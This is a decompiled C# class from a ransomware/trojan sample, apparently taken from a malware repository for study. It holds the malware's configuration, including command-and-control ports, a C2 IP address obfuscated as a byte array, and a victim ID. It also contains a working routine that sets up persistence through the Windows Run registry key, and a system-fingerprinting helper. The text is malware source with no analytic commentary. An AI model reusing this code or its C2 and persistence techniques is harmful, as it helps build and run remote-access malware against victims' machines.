// Decompiled with JetBrains decompiler
// Type: tbahmanra.CAEZRNF
// Assembly: tbahmanra, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 4D9C8A1A-BE3E-47BA-A807-18A8CAD92DB5
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.07-msil\HEUR-Trojan-Ransom.MSIL.Foreign.gen-67a225feedc5ce4adf75acb41e8b0e746e7daaec779225cd72f860a263b92a6e.exe

using Microsoft.Win32;
using System;
using System.IO;
using System.Windows.Forms;

namespace tbahmanra
{
  internal static class CAEZRNF
  {
    public static string tbahmanramainApp = Path.GetFileNameWithoutExtension(Application.ExecutablePath);
    public static int[] ports = new int[5]
    {
      4125,
      6522,
      11422,
      14624,
      16621
    };
    public static int tbahmanraport;
    public static string tbahmanrapc_id = "rlhuar|tbahmanra".Split('|')[0];
    public static byte[] tbahmanravpsips = new byte[14]
    {
      (byte) 49,
      (byte) 57,
      (byte) 49,
      (byte) 46,
      (byte) 49,
      (byte) 48,
      (byte) 49,
      (byte) 46,
      (byte) 49,
      (byte) 55,
      (byte) 50,
      (byte) 46,
      (byte) 52,
      (byte) 52
    };
    public static string filePath = Application.ExecutablePath.ToString();
    public static string tbahmanradefaultP = "215.240.250.102|tbahmanra".Split('|')[0];
    public static string tbahmanraremvUser = "redlerda|tbahmanra".Split('|')[0];
    public static string tbahmanrafilesLogs = "udbias".Split('|')[0];

    public static byte[] getByteArray(string value)
    {
      MemoryStream memoryStream = new MemoryStream();
      TextWriter textWriter = (TextWriter) new StreamWriter((Stream) memoryStream);
      textWriter.Write(value);
      textWriter.Flush();
      memoryStream.Flush();
      return memoryStream.ToArray();
    }

    public static void tbahmanraset_run(string app, string path)
    {
      try
      {
        string name = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run|tbahmanra".Split('|')[0];
        RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(name, true);
        object obj = registryKey.GetValue(CAEZRNF.tbahmanrapc_id + app);
        if (obj != null && !(obj.ToString() != path))
          return;
        registryKey.SetValue(CAEZRNF.tbahmanrapc_id + app, (object) path);
      }
      catch
      {
      }
    }

    public static string tbahmanraget_mpath() => Path.GetDirectoryName(CAEZRNF.filePath) + "\\".ToString();

    public static string tbahmanraOsname()
    {
      try
      {
        OperatingSystem osVersion = Environment.OSVersion;
        int num = osVersion.Version.Major;
        string str1 = num.ToString();
        num = osVersion.Version.Minor;
        string str2 = num.ToString();
        return str1 + ">" + str2;
      }
      catch
      {
        return "6>1!tbahmanra".Split('!')[0];
      }
    }
  }
}
